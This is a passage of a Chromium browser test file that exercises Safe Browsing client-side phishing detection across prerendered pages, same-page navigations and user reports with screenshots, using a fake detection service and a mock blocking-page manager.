// Copyright 2017 The Chromium Authors
// Use of this source code is governed by a BSD-style license that can be
// found in the LICENSE file.

#include "components/safe_browsing/content/browser/client_side_detection_host.h"

#include "base/compiler_specific.h"
#include "base/run_loop.h"
#include "base/strings/string_number_conversions.h"
#include "base/test/bind.h"
#include "base/test/scoped_feature_list.h"
#include "base/test/test_future.h"
#include "chrome/browser/interstitials/security_interstitial_page_test_utils.h"
#include "chrome/browser/profiles/profile.h"
#include "chrome/browser/safe_browsing/chrome_client_side_detection_host_delegate.h"
#include "chrome/browser/safe_browsing/chrome_safe_browsing_blocking_page_factory.h"
#include "chrome/browser/safe_browsing/chrome_ui_manager_delegate.h"
#include "chrome/browser/safe_browsing/safe_browsing_service.h"
#include "chrome/browser/ui/browser.h"
#include "chrome/browser/ui/exclusive_access/exclusive_access_context.h"
#include "chrome/browser/ui/exclusive_access/exclusive_access_manager.h"
#include "chrome/browser/ui/exclusive_access/exclusive_access_test.h"
#include "chrome/browser/ui/tabs/tab_strip_model.h"
#include "chrome/common/url_constants.h"
#include "chrome/test/base/in_process_browser_test.h"
#include "chrome/test/base/ui_test_utils.h"
#include "components/autofill/content/browser/content_autofill_driver.h"
#include "components/autofill/core/browser/foundations/autofill_manager.h"
#include "components/history/core/browser/history_service.h"
#include "components/prefs/pref_service.h"
#include "components/safe_browsing/buildflags.h"
#include "components/safe_browsing/content/browser/client_side_detection_feature_cache.h"
#include "components/safe_browsing/content/browser/client_side_detection_service.h"
#include "components/safe_browsing/content/browser/client_side_phishing_model.h"
#include "components/safe_browsing/content/browser/credit_card_form_event.h"
#include "components/safe_browsing/content/browser/ui_manager.h"
#include "components/safe_browsing/core/common/features.h"
#include "components/safe_browsing/core/common/proto/client_model.pb.h"
#include "components/safe_browsing/core/common/proto/csd.pb.h"
#include "components/safe_browsing/core/common/safe_browsing_prefs.h"
#include "content/public/browser/browser_context.h"
#include "content/public/browser/render_frame_host.h"
#include "content/public/browser/render_widget_host_view.h"
#include "content/public/browser/web_contents_observer.h"
#include "content/public/test/browser_test.h"
#include "content/public/test/mock_navigation_handle.h"
#include "content/public/test/prerender_test_util.h"
#include "net/dns/mock_host_resolver.h"
#include "net/http/http_status_code.h"
#include "net/test/embedded_test_server/embedded_test_server.h"
#include "testing/gmock/include/gmock/gmock.h"
#include "testing/gtest/include/gtest/gtest.h"
#include "third_party/skia/include/core/SkBitmap.h"
#include "ui/gfx/image/image_unittest_util.h"
#include "url/gurl.h"

namespace safe_browsing {
namespace {

using ::testing::_;
using ::testing::StrictMock;

class FakeDelegate : public ClientSideDetectionService::Delegate {
  PrefService* GetPrefs() override { return nullptr; }
  scoped_refptr<network::SharedURLLoaderFactory> GetURLLoaderFactory()
      override {
    return nullptr;
  }
  scoped_refptr<network::SharedURLLoaderFactory>
  GetSafeBrowsingURLLoaderFactory() override {
    return nullptr;
  }
  bool ShouldSendModelToBrowserContext(
      content::BrowserContext* context) override {
    return true;
  }
};

class FakeClientSideDetectionService : public ClientSideDetectionService {
 public:
  FakeClientSideDetectionService()
      : ClientSideDetectionService(std::make_unique<FakeDelegate>(), nullptr) {}

  void SendClientReportPhishingRequest(
      std::unique_ptr<ClientPhishingRequest> verdict,
      ClientReportPhishingRequestCallback callback,
      const std::string& access_token) override {
    saved_request_ = *verdict;
    saved_callback_ = std::move(callback);
    access_token_ = access_token;
    request_callback_.Run();
  }

  void ClassifyPhishingThroughThresholds(
      ClientPhishingRequest* verdict) override {
    // Just like how we always send the ping due to DOM classification, we will
    // do the same when doing visual features thresholds classification.
    verdict->set_is_phishing(true);
  }

  const ClientPhishingRequest& saved_request() { return saved_request_; }

  bool saved_callback_is_null() { return saved_callback_.is_null(); }

  ClientReportPhishingRequestCallback saved_callback() {
    return std::move(saved_callback_);
  }

  void SetModel(std::string client_side_model) {
    client_side_model_ = client_side_model;
  }

  CSDModelType GetModelType() override { return CSDModelType::kFlatbuffer; }

  bool IsModelAvailable() override { return true; }

  // This is a fake CSD service which will have no TfLite models.
  const base::File& GetVisualTfLiteModel() override {
    return visual_tflite_model_;
  }

  int GetClassificationInputHeight() override { return 0; }
  int GetClassificationInputWidth() override { return 0; }
  int GetImageEmbeddingInputHeight() override { return 0; }
  int GetImageEmbeddingInputWidth() override { return 0; }

  base::ReadOnlySharedMemoryRegion GetModelSharedMemoryRegion() override {
    base::MappedReadOnlyRegion mapped_region =
        base::ReadOnlySharedMemoryRegion::Create(client_side_model_.length());
    mapped_region.mapping.GetMemoryAsSpan<uint8_t>().copy_from(
        base::as_byte_span(client_side_model_));
    return mapped_region.region.Duplicate();
  }

  // This is a fake CSD service which will have no thresholds due to no TfLite
  // models.
  const std::vector<TfLiteModelMetadata::Threshold>&
  GetVisualTfLiteModelThresholds() override {
    return thresholds_;
  }

  void SetRequestCallback(const base::RepeatingClosure& closure) {
    request_callback_ = closure;
  }

  base::WeakPtr<ClientSideDetectionService> GetWeakPtr() {
    return weak_factory_.GetWeakPtr();
  }

 private:
  ClientPhishingRequest saved_request_;
  ClientReportPhishingRequestCallback saved_callback_;
  ClientSideModel model_;
  std::string access_token_;
  std::string client_side_model_;
  base::File visual_tflite_model_;
  std::vector<TfLiteModelMetadata::Threshold> thresholds_;
  base::RepeatingClosure request_callback_;
  base::WeakPtrFactory<ClientSideDetectionService> weak_factory_{this};
};

class MockSafeBrowsingUIManager : public SafeBrowsingUIManager {
 public:
  MockSafeBrowsingUIManager()
      : SafeBrowsingUIManager(
            std::make_unique<ChromeSafeBrowsingUIManagerDelegate>(),
            std::make_unique<ChromeSafeBrowsingBlockingPageFactory>(),
            chrome::ChromeUINewTabURLAsGURL()) {}

  MockSafeBrowsingUIManager(const MockSafeBrowsingUIManager&) = delete;
  MockSafeBrowsingUIManager& operator=(const MockSafeBrowsingUIManager&) =
      delete;

  MOCK_METHOD1(DisplayBlockingPage, void(const UnsafeResource& resource));

 protected:
  ~MockSafeBrowsingUIManager() override = default;
};

// This class waits for page load state that ClientSideDetectionHost observes as
// a WebContentsObserver. ClientSideDetectionHost observes the two functions
// listed before starting the preclassification check.
class PaintObserverWaiter : public content::WebContentsObserver {
 public:
  explicit PaintObserverWaiter(content::WebContents* web_contents)
      : WebContentsObserver(web_contents) {}

  void DidFirstVisuallyNonEmptyPaint() override {
    did_paint_ = true;
    if (did_fcp_) {
      run_loop_.Quit();
    }
  }

  void OnFirstContentfulPaintInPrimaryMainFrame() override {
    did_fcp_ = true;
    if (did_paint_) {
      run_loop_.Quit();
    }
  }

  void Wait() {
    if (!did_paint_ || !did_fcp_) {
      run_loop_.Run();
    }
  }

 private:
  bool did_paint_ = false;
  bool did_fcp_ = false;
  base::RunLoop run_loop_;
};

std::string set_up_client_side_model() {
  flatbuffers::FlatBufferBuilder builder(1024);
  std::vector<flatbuffers::Offset<flat::Hash>> hashes;
  // Make sure this is sorted.
  std::vector<std::string> hashes_vector = {"feature1", "feature2", "feature3",
                                            "token one", "token two"};
  for (std::string& feature : hashes_vector) {
    std::vector<uint8_t> hash_data(feature.begin(), feature.end());
    hashes.push_back(flat::CreateHashDirect(builder, &hash_data));
  }
  flatbuffers::Offset<flatbuffers::Vector<flatbuffers::Offset<flat::Hash>>>
      hashes_flat = builder.CreateVector(hashes);

  std::vector<flatbuffers::Offset<flat::ClientSideModel_::Rule>> rules;
  std::vector<int32_t> rule_feature1 = {};
  std::vector<int32_t> rule_feature2 = {0};
  std::vector<int32_t> rule_feature3 = {0, 1};
  rules.push_back(
      flat::ClientSideModel_::CreateRuleDirect(builder, &rule_feature1, 0.5));
  rules.push_back(
      flat::ClientSideModel_::CreateRuleDirect(builder, &rule_feature2, 2));
  rules.push_back(
      flat::ClientSideModel_::CreateRuleDirect(builder, &rule_feature3, 3));
  flatbuffers::Offset<
      flatbuffers::Vector<flatbuffers::Offset<flat::ClientSideModel_::Rule>>>
      rules_flat = builder.CreateVector(rules);

  std::vector<int32_t> page_terms_vector = {3, 4};
  flatbuffers::Offset<flatbuffers::Vector<int32_t>> page_term_flat =
      builder.CreateVector(page_terms_vector);

  std::vector<uint32_t> page_words_vector = {1000U, 2000U, 3000U};
  flatbuffers::Offset<flatbuffers::Vector<uint32_t>> page_word_flat =
      builder.CreateVector(page_words_vector);

  std::vector<
      flatbuffers::Offset<safe_browsing::flat::TfLiteModelMetadata_::Threshold>>
      thresholds_vector = {};
  flatbuffers::Offset<flat::TfLiteModelMetadata> tflite_metadata_flat =
      flat::CreateTfLiteModelMetadataDirect(builder, 0, &thresholds_vector, 0,
                                            0);
  flat::ClientSideModelBuilder csd_model_builder(builder);
  csd_model_builder.add_version(123);
  // The model will always trigger.
  csd_model_builder.add_threshold_probability(-1);
  csd_model_builder.add_hashes(hashes_flat);
  csd_model_builder.add_rule(rules_flat);
  csd_model_builder.add_page_term(page_term_flat);
  csd_model_builder.add_page_word(page_word_flat);
  csd_model_builder.add_max_words_per_term(2);
  csd_model_builder.add_murmur_hash_seed(12345U);
  csd_model_builder.add_max_shingles_per_page(10);
  csd_model_builder.add_shingle_size(3);
  csd_model_builder.add_tflite_metadata(tflite_metadata_flat);
  csd_model_builder.add_img_embedding_metadata(tflite_metadata_flat);
  builder.Finish(csd_model_builder.Finish());

  return std::string(reinterpret_cast<char*>(builder.GetBufferPointer()),
                     builder.GetSize());
}

}  // namespace

class ClientSideDetectionHostPrerenderBrowserTest
    : public InProcessBrowserTest {
 public:
  ClientSideDetectionHostPrerenderBrowserTest() {
    prerender_helper_ = std::make_unique<content::test::PrerenderTestHelper>(
        base::BindRepeating(
            &ClientSideDetectionHostPrerenderBrowserTest::GetWebContents,
            base::Unretained(this)));
  }
  ~ClientSideDetectionHostPrerenderBrowserTest() override = default;
  ClientSideDetectionHostPrerenderBrowserTest(
      const ClientSideDetectionHostPrerenderBrowserTest&) = delete;
  ClientSideDetectionHostPrerenderBrowserTest& operator=(
      const ClientSideDetectionHostPrerenderBrowserTest&) = delete;

  void SetUp() override {
    prerender_helper_->RegisterServerRequestMonitor(embedded_test_server());
    InProcessBrowserTest::SetUp();
  }

  void SetUpOnMainThread() override {
    flatbuffer_model_str_ = set_up_client_side_model();
    host_resolver()->AddRule("*", "127.0.0.1");
    ASSERT_TRUE(embedded_test_server()->Start());
  }

  content::test::PrerenderTestHelper& prerender_helper() {
    return *prerender_helper_.get();
  }

  content::WebContents* GetWebContents() {
    return browser()->tab_strip_model()->GetActiveWebContents();
  }

  std::string client_side_model() { return flatbuffer_model_str_; }

 protected:
  base::test::ScopedFeatureList scoped_feature_list_;

 private:
  std::unique_ptr<content::test::PrerenderTestHelper> prerender_helper_;
  std::string flatbuffer_model_str_;
};

class ClientSideDetectionHostPrerenderExclusiveAccessBrowserTest
    : public ExclusiveAccessTest {
 public:
  ClientSideDetectionHostPrerenderExclusiveAccessBrowserTest()
      : prerender_helper_(base::BindRepeating(
            &ClientSideDetectionHostPrerenderExclusiveAccessBrowserTest::
                GetWebContents,
            base::Unretained(this))) {}
  ~ClientSideDetectionHostPrerenderExclusiveAccessBrowserTest() override =
      default;
  ClientSideDetectionHostPrerenderExclusiveAccessBrowserTest(
      const ClientSideDetectionHostPrerenderExclusiveAccessBrowserTest&) =
      delete;
  ClientSideDetectionHostPrerenderExclusiveAccessBrowserTest& operator=(
      const ClientSideDetectionHostPrerenderExclusiveAccessBrowserTest&) =
      delete;

  void SetUp() override {
    prerender_helper_.RegisterServerRequestMonitor(embedded_test_server());
    ExclusiveAccessTest::SetUp();
  }

  void SetUpOnMainThread() override {
    flatbuffer_model_str_ = set_up_client_side_model();
    host_resolver()->AddRule("*", "127.0.0.1");
    ASSERT_TRUE(embedded_test_server()->Start());
    ExclusiveAccessTest::SetUpOnMainThread();
  }

  content::test::PrerenderTestHelper& prerender_helper() {
    return prerender_helper_;
  }

  content::WebContents* GetWebContents() {
    return browser()->tab_strip_model()->GetActiveWebContents();
  }

  std::string client_side_model() { return flatbuffer_model_str_; }

 private:
  content::test::PrerenderTestHelper prerender_helper_;
  std::string flatbuffer_model_str_;
};

IN_PROC_BROWSER_TEST_F(ClientSideDetectionHostPrerenderBrowserTest,
                       PrerenderShouldNotAffectClientSideDetection) {
  if (base::FeatureList::IsEnabled(kClientSideDetectionKillswitch)) {
    GTEST_SKIP();
  }

  if (base::FeatureList::IsEnabled(kClientSideDetectionOnlyESBClassification)) {
    SetSafeBrowsingState(browser()->profile()->GetPrefs(),
                         SafeBrowsingState::ENHANCED_PROTECTION);
  }

  FakeClientSideDetectionService fake_csd_service;
  fake_csd_service.SetModel(client_side_model());

  scoped_refptr<StrictMock<MockSafeBrowsingUIManager>> mock_ui_manager =
      new StrictMock<MockSafeBrowsingUIManager>();

  std::unique_ptr<ClientSideDetectionHost> csd_host =
      ChromeClientSideDetectionHostDelegate::CreateHost(
          browser()->tab_strip_model()->GetActiveWebContents());
  csd_host->set_client_side_detection_service(fake_csd_service.GetWeakPtr());
  csd_host->set_ui_manager(mock_ui_manager.get());

  fake_csd_service.SendModelToRenderers();

  GURL page_url(embedded_test_server()->GetURL("/safe_browsing/malware.html"));
  if (base::FeatureList::IsEnabled(kClientSideDetectionNewObservers)) {
    // With new observers, we wait beyond the prerender state to start
    // pre-classification.
    PaintObserverWaiter paint_waiter(GetWebContents());
    ASSERT_TRUE(ui_test_utils::NavigateToURL(browser(), page_url));
    prerender_helper().AddPrerender(page_url);
    prerender_helper().NavigatePrimaryPage(page_url);
    paint_waiter.Wait();
  } else {
    ASSERT_TRUE(ui_test_utils::NavigateToURL(browser(), page_url));
  }

  base::RunLoop run_loop;
  fake_csd_service.SetRequestCallback(run_loop.QuitClosure());

  // Bypass the pre-classification checks.
  csd_host->current_outermost_main_frame_id_ =
      GetWebContents()->GetPrimaryMainFrame()->GetGlobalId();
  csd_host->OnPhishingPreClassificationDone(
      ClientSideDetectionType::TRIGGER_MODELS, /*should_classify=*/true,
      /*is_sample_ping=*/false, /*did_match_high_confidence_allowlist=*/false,
      /*is_invalid_ip=*/false);

  // A prerendered navigation committing should not cancel classification.
  // We simulate the commit of a prerendered navigation to avoid races
  // between the completion of phishing detection in the primary
  // main frame's renderer and the commit of a real prerendered navigation.
  // TODO(mcnee): Use a real prerendered navigation here and make sure the
  // navigation doesn't race with the classification.
  content::MockNavigationHandle prerendered_navigation_handle;
  prerendered_navigation_handle.set_has_committed(true);
  prerendered_navigation_handle.set_is_in_primary_main_frame(false);
  csd_host->DidFinishNavigation(&prerendered_navigation_handle);

  run_loop.Run();

  ASSERT_FALSE(fake_csd_service.saved_callback_is_null());

  EXPECT_EQ(fake_csd_service.saved_request().http_response_code(), 200);

  // Expect an interstitial to be shown.
  EXPECT_CALL(*mock_ui_manager, DisplayBlockingPage(_));
  std::move(fake_csd_service.saved_callback())
      .Run(page_url, true, net::HTTP_OK, std::nullopt);
}

IN_PROC_BROWSER_TEST_F(ClientSideDetectionHostPrerenderBrowserTest,
                       SamePageNavigationShouldNotAffectClientSideDetection) {
  if (base::FeatureList::IsEnabled(kClientSideDetectionKillswitch)) {
    GTEST_SKIP();
  }

  if (base::FeatureList::IsEnabled(kClientSideDetectionOnlyESBClassification)) {
    SetSafeBrowsingState(browser()->profile()->GetPrefs(),
                         SafeBrowsingState::ENHANCED_PROTECTION);
  }

  FakeClientSideDetectionService fake_csd_service;
  fake_csd_service.SetModel(client_side_model());

  auto* web_contents = browser()->tab_strip_model()->GetActiveWebContents();
  std::unique_ptr<ClientSideDetectionHost> csd_host =
      ChromeClientSideDetectionHostDelegate::CreateHost(web_contents);
  csd_host->set_client_side_detection_service(fake_csd_service.GetWeakPtr());

  fake_csd_service.SendModelToRenderers();

  GURL page_url(embedded_test_server()->GetURL("/safe_browsing/malware.html"));
  if (base::FeatureList::IsEnabled(kClientSideDetectionNewObservers)) {
    PaintObserverWaiter paint_waiter(web_contents);
    ASSERT_TRUE(ui_test_utils::NavigateToURL(browser(), page_url));
    prerender_helper().AddPrerender(page_url);
    prerender_helper().NavigatePrimaryPage(page_url);
    paint_waiter.Wait();
  } else {
    ASSERT_TRUE(ui_test_utils::NavigateToURL(browser(), page_url));
  }

  base::RunLoop run_loop;
  fake_csd_service.SetRequestCallback(run_loop.QuitClosure());

  // Bypass the pre-classification checks.
  csd_host->OnPhishingPreClassificationDone(
      ClientSideDetectionType::TRIGGER_MODELS, /*should_classify=*/true,
      /*is_sample_ping=*/false, /*did_match_high_confidence_allowlist=*/false,
      /*is_invalid_ip=*/false);

  run_loop.Run();

  // A same page navigation committing should not cancel classification.
  // The worst case if navigation in an iframe, so locate the iframe.
  size_t frame_counter = 0;
  content::RenderFrameHost* iframe_rfh = nullptr;
  web_contents->ForEachRenderFrameHostWithAction(
      [&frame_counter, &iframe_rfh](content::RenderFrameHost* current_frame) {
        if (frame_counter == 1) {
          iframe_rfh = current_frame;
          return content::RenderFrameHost::FrameIterationAction::kStop;
        }
        frame_counter++;
        return content::RenderFrameHost::FrameIterationAction::kContinue;
      });

  ASSERT_TRUE(content::ExecJs(iframe_rfh, "window.location.hash='#foo';"));

  ASSERT_FALSE(fake_csd_service.saved_callback_is_null());

  // Expect an interstitial to be shown. We intentionally use real ui manager to
  // check that all ui manager pipeline works correctly.
  content::TestNavigationObserver observer(web_contents);
  std::move(fake_csd_service.saved_callback())
      .Run(page_url, true, net::HTTP_OK, std::nullopt);
  observer.Wait();
  EXPECT_TRUE(
      chrome_browser_interstitials::IsShowingInterstitial(web_contents));
}

IN_PROC_BROWSER_TEST_F(ClientSideDetectionHostPrerenderBrowserTest,
                       ClassifyPrerenderedPageAfterActivation) {
  if (base::FeatureList::IsEnabled(kClientSideDetectionKillswitch)) {
    GTEST_SKIP();
  }

  if (base::FeatureList::IsEnabled(kClientSideDetectionOnlyESBClassification)) {
    SetSafeBrowsingState(browser()->profile()->GetPrefs(),
                         SafeBrowsingState::ENHANCED_PROTECTION);
  }

  FakeClientSideDetectionService fake_csd_service;
  fake_csd_service.SetModel(client_side_model());

  scoped_refptr<StrictMock<MockSafeBrowsingUIManager>> mock_ui_manager =
      new StrictMock<MockSafeBrowsingUIManager>();

  std::unique_ptr<ClientSideDetectionHost> csd_host =
      ChromeClientSideDetectionHostDelegate::CreateHost(
          browser()->tab_strip_model()->GetActiveWebContents());
  csd_host->set_client_side_detection_service(fake_csd_service.GetWeakPtr());
  csd_host->set_ui_manager(mock_ui_manager.get());

  fake_csd_service.SendModelToRenderers();

  base::RunLoop run_loop;
  fake_csd_service.SetRequestCallback(run_loop.QuitClosure());

  const GURL initial_url(embedded_test_server()->GetURL("/title1.html"));
  if (base::FeatureList::IsEnabled(kClientSideDetectionNewObservers)) {
    PaintObserverWaiter paint_waiter(GetWebContents());
    ASSERT_TRUE(ui_test_utils::NavigateToURL(browser(), initial_url));
    paint_waiter.Wait();
  } else {
    ASSERT_TRUE(ui_test_utils::NavigateToURL(browser(), initial_url));
  }

  // Prerender then activate a phishing page.
  const GURL prerender_url =
      embedded_test_server()->GetURL("/safe_browsing/malware.html");
  prerender_helper().AddPrerender(prerender_url);
  if (base::FeatureList::IsEnabled(kClientSideDetectionNewObservers)) {
    PaintObserverWaiter paint_waiter(GetWebContents());
    prerender_helper().NavigatePrimaryPage(prerender_url);
    paint_waiter.Wait();
  } else {
    prerender_helper().NavigatePrimaryPage(prerender_url);
  }

  // Bypass the pre-classification checks.
  csd_host->OnPhishingPreClassificationDone(
      ClientSideDetectionType::TRIGGER_MODELS, /*should_classify=*/true,
      /*is_sample_ping=*/false, /*did_match_high_confidence_allowlist=*/false,
      /*is_invalid_ip=*/false);

  run_loop.Run();

  ASSERT_FALSE(fake_csd_service.saved_callback_is_null());

  // Expect an interstitial to be shown.
  EXPECT_CALL(*mock_ui_manager, DisplayBlockingPage(_));
  std::move(fake_csd_service.saved_callback())
      .Run(prerender_url, true, net::HTTP_OK, std::nullopt);
}

class ClientSideDetectionHostPrerenderBrowserTest_Screenshot
    : public ClientSideDetectionHostPrerenderBrowserTest {
 public:
  ClientSideDetectionHostPrerenderBrowserTest_Screenshot() = default;
  ~ClientSideDetectionHostPrerenderBrowserTest_Screenshot() override = default;

 protected:
  ClientPhishingRequest RunReportUnsafeSite(int screenshot_width,
                                            int screenshot_height) {
    FakeClientSideDetectionService fake_csd_service;
    fake_csd_service.SetModel(client_side_model());

    std::unique_ptr<ClientSideDetectionHost> csd_host =
        ChromeClientSideDetectionHostDelegate::CreateHost(
            browser()->tab_strip_model()->GetActiveWebContents());
    csd_host->set_client_side_detection_service(fake_csd_service.GetWeakPtr());

    fake_csd_service.SendModelToRenderers();

    GURL page_url(
        embedded_test_server()->GetURL("/safe_browsing/malware.html"));
    CHECK(ui_test_utils::NavigateToURL(browser(), page_url));

    base::RunLoop run_loop;
    fake_csd_service.SetRequestCallback(run_loop.QuitClosure());

    const SkBitmap screenshot =
        gfx::test::CreateBitmap(screenshot_width, screenshot_height);

    base::test::TestFuture<void> future;
    csd_host->ReportUnsafeSite(screenshot, future.GetCallback());

    // Bypass the pre-classification check to directly test the screenshot
    // plumbing.
    csd_host->OnPhishingPreClassificationDone(
        ClientSideDetectionType::USER_REPORT, /*should_classify=*/true,
        /*is_sample_ping=*/false,
        /*did_match_high_confidence_allowlist=*/false,
        /*is_invalid_ip=*/false);

    run_loop.Run();

    EXPECT_TRUE(future.IsReady());

    return fake_csd_service.saved_request();
  }

  void CheckDimensions(const VisualFeatures_Screenshot& screenshot,
                       int expected_width,
                       int expected_height) {
    EXPECT_EQ(screenshot.width(), expected_width);
    EXPECT_EQ(screenshot.height(), expected_height);
    EXPECT_EQ(screenshot.data().size(), expected_width * expected_height * 3);
  }
};

IN_PROC_BROWSER_TEST_F(ClientSideDetectionHostPrerenderBrowserTest_Screenshot,
                       ReportUnsafeSiteWithScreenshot) {
  if (base::FeatureList::IsEnabled(kClientSideDetectionKillswitch)) {
    GTEST_SKIP();
  }

  const int kScreenshotWidth = 100;
  const int kScreenshotHeight = 100;
  ASSERT_LT(kScreenshotWidth,
            ClientSideDetectionHost::kMaxHighResScreenshotWidth);
  ASSERT_LT(kScreenshotHeight,
            ClientSideDetectionHost::kMaxHighResScreenshotHeight);
  ClientPhishingRequest saved_request =
      RunReportUnsafeSite(kScreenshotWidth, kScreenshotHeight);
  CheckDimensions(saved_request.visual_features().high_res_screenshot(),
                  kScreenshotWidth, kScreenshotHeight);
  EXPECT_EQ(saved_request.client_side_detection_type(),
            ClientSideDetectionType::USER_REPORT);
  EXPECT_EQ(saved_request.http_response_code(), 200);
}

IN_PROC_BROWSER_TEST_F(ClientSideDetectionHostPrerenderBrowserTest_Screenshot,
                       ReportUnsafeSiteWithScreenshot_MaxSize) {
  if (base::FeatureList::IsEnabled(kClientSideDetectionKillswitch)) {
    GTEST_SKIP();
  }

  const int kScreenshotWidth =
      ClientSideDetectionHost::kMaxHighResScreenshotWidth;
  const int kScreenshotHeight =
      ClientSideDetectionHost::kMaxHighResScreenshotHeight;
  ClientPhishingRequest saved_request =
      RunReportUnsafeSite(kScreenshotWidth, kScreenshotHeight);
  CheckDimensions(saved_request.visual_features().high_res_screenshot(),
                  kScreenshotWidth, kScreenshotHeight);
  EXPECT_EQ(saved_request.client_side_detection_type(),
            ClientSideDetectionType::USER_REPORT);
  EXPECT_EQ(saved_request.http_response_code(), 200);
}

IN_PROC_BROWSER_TEST_F(ClientSideDetectionHostPrerenderBrowserTest_Screenshot,
                       ReportUnsafeSiteScreenshotTooWide) {
  if (base::FeatureList::IsEnabled(kClientSideDetectionKillswitch)) {
    GTEST_SKIP();
  }

  const int kScreenshotWidth = 5000;
  const int kScreenshotHeight = 2000;
  ASSERT_GT(kScreenshotWidth,
            ClientSideDetectionHost::kMaxHighResScreenshotWidth);
  ASSERT_LE(kScreenshotHeight,
            ClientSideDetectionHost::kMaxHighResScreenshotHeight);
  ClientPhishingRequest saved_request =
      RunReportUnsafeSite(kScreenshotWidth, kScreenshotHeight);
  EXPECT_FALSE(saved_request.visual_features().has_high_res_screenshot());
  EXPECT_EQ(saved_request.client_side_detection_type(),
            ClientSideDetectionType::USER_REPORT);
}

IN_PROC_BROWSER_TEST_F(ClientSideDetectionHostPrerenderBrowserTest_Screenshot,
                       ReportUnsafeSiteScreenshotTooTall) {
  if (base::FeatureList::IsEnabled(kClientSideDetectionKillswitch)) {
    GTEST_SKIP();
  }

  const int kScreenshotWidth = 2000;
  const int kScreenshotHeight = 5000;
  ASSERT_LE(kScreenshotWidth,
            ClientSideDetectionHost::kMaxHighResScreenshotWidth);
  ASSERT_GT(kScreenshotHeight,
            ClientSideDetectionHost::kMaxHighResScreenshotHeight);
  const ClientPhishingRequest& saved_request =
      RunReportUnsafeSite(kScreenshotWidth, kScreenshotHeight);
  EXPECT_FALSE(saved_request.visual_features().has_high_res_screenshot());
  EXPECT_EQ(saved_request.client_side_detection_type(),
            ClientSideDetectionType::USER_REPORT);
}

IN_PROC_BROWSER_TEST_F(ClientSideDetectionHostPrerenderBrowserTest_Screenshot,
                       ReportUnsafeSiteNoScreenshot) {
  if (base::FeatureList::IsEnabled(kClientSideDetectionKillswitch)) {
    GTEST_SKIP();
  }

  ClientPhishingRequest saved_request = RunReportUnsafeSite(0, 0);
  EXPECT_FALSE(saved_request.visual_features().has_high_res_screenshot());
  EXPECT_EQ(saved_request.client_side_detection_type(),
            ClientSideDetectionType::USER_REPORT);
  EXPECT_EQ(saved_request.http_response_code(), 200);
}

IN_PROC_BROWSER_TEST_F(
    ClientSideDetectionHostPrerenderBrowserTest,
    ClassifyPrerenderedPageAfterActivationAndCheckDebuggingMetadataCache) {
  if (base::FeatureList::IsEnabled(kClientSideDetectionKillswitch)) {
    GTEST_SKIP();
  }

  SetSafeBrowsingState(browser()->profile()->GetPrefs(),
                       SafeBrowsingState::ENHANCED_PROTECTION);

  FakeClientSideDetectionService fake_csd_service;
  fake_csd_service.SetModel(client_side_model());

  scoped_refptr<StrictMock<MockSafeBrowsingUIManager>> mock_ui_manager =
      new StrictMock<MockSafeBrowsingUIManager>();

  std::unique_ptr<ClientSideDetectionHost> csd_host =
      ChromeClientSideDetectionHostDelegate::CreateHost(
          browser()->tab_strip_model()->GetActiveWebContents());
  csd_host->set_client_side_detection_service(fake_csd_service.GetWeakPtr());
  csd_host->set_ui_manager(mock_ui_manager.get());

  fake_csd_service.SendModelToRenderers();

  base::RunLoop run_loop;
  fake_csd_service.SetRequestCallback(run_loop.QuitClosure());

  const GURL initial_url(embedded_test_server()->GetURL("/title1.html"));
  if (base::FeatureList::IsEnabled(kClientSideDetectionNewObservers)) {
    PaintObserverWaiter paint_waiter(GetWebContents());
    ASSERT_TRUE(ui_test_utils::NavigateToURL(browser(), initial_url));
    paint_waiter.Wait();
  } else {
    ASSERT_TRUE(ui_test_utils::NavigateToURL(browser(), initial_url));
  }

  // Prerender then activate a phishing page.
  const GURL prerender_url =
      embedded_test_server()->GetURL("/safe_browsing/malware.html");
  prerender_helper().AddPrerender(prerender_url);
  if (base::FeatureList::IsEnabled(kClientSideDetectionNewObservers)) {
    PaintObserverWaiter paint_waiter(GetWebContents());
    prerender_helper().NavigatePrimaryPage(prerender_url);
    paint_waiter.Wait();
  } else {
    prerender_helper().NavigatePrimaryPage(prerender_url);
  }

  // Bypass the pre-classification checks.
  csd_host->OnPhishingPreClassificationDone(
      ClientSideDetectionType::TRIGGER_MODELS, /*should_classify=*/true,
      /*is_sample_ping=*/false, /*did_match_high_confidence_allowlist=*/false,
      /*is_invalid_ip=*/false);

  run_loop.Run();

  ASSERT_FALSE(fake_csd_service.saved_callback_is_null());

  // Expect an interstitial to be shown.
  EXPECT_CALL(*mock_ui_manager, DisplayBlockingPage(_));
  std::move(fake_csd_service.saved_callback())
      .Run(prerender_url, true, net::HTTP_OK, std::nullopt);

  ClientSideDetectionFeatureCache* feature_cache_map =
      ClientSideDetectionFeatureCache::FromWebContents(GetWebContents());
  LoginReputationClientRequest::DebuggingMetadata* debugging_metadata =
      feature_cache_map->GetOrCreateDebuggingMetadataForURL(prerender_url);

  // The value remains private ip since we bypassed it in the test.
  EXPECT_EQ(debugging_metadata->preclassification_check_result(),
            PreClassificationCheckResult::NO_CLASSIFY_PRIVATE_IP);
  EXPECT_EQ(debugging_metadata->network_result(), net::HTTP_OK);
  EXPECT_EQ(debugging_metadata->phishing_detector_result(),
            PhishingDetectorResult::CLASSIFICATION_SUCCESS);
  EXPECT_TRUE(debugging_metadata->local_model_detects_phishing());
}

IN_PROC_BROWSER_TEST_F(
    ClientSideDetectionHostPrerenderBrowserTest,
    CheckDebuggingMetadataCacheAfterClearingCacheAfterNavigation) {
  if (base::FeatureList::IsEnabled(kClientSideDetectionKillswitch)) {
    GTEST_SKIP();
  }

  SetSafeBrowsingState(browser()->profile()->GetPrefs(),
                       SafeBrowsingState::ENHANCED_PROTECTION);

  ClientSideDetectionFeatureCache* feature_cache_map =
      ClientSideDetectionFeatureCache::FromWebContents(GetWebContents());

  FakeClientSideDetectionService fake_csd_service;
  fake_csd_service.SetModel(client_side_model());

  scoped_refptr<StrictMock<MockSafeBrowsingUIManager>> mock_ui_manager =
      new StrictMock<MockSafeBrowsingUIManager>();

  std::unique_ptr<ClientSideDetectionHost> csd_host =
      ChromeClientSideDetectionHostDelegate::CreateHost(
          browser()->tab_strip_model()->GetActiveWebContents());
  csd_host->set_client_side_detection_service(fake_csd_service.GetWeakPtr());
  csd_host->set_ui_manager(mock_ui_manager.get());

  fake_csd_service.SendModelToRenderers();

  base::RunLoop run_loop;
  fake_csd_service.SetRequestCallback(run_loop.QuitClosure());

  const GURL initial_url(embedded_test_server()->GetURL("/title1.html"));
  if (base::FeatureList::IsEnabled(kClientSideDetectionNewObservers)) {
    PaintObserverWaiter paint_waiter(GetWebContents());
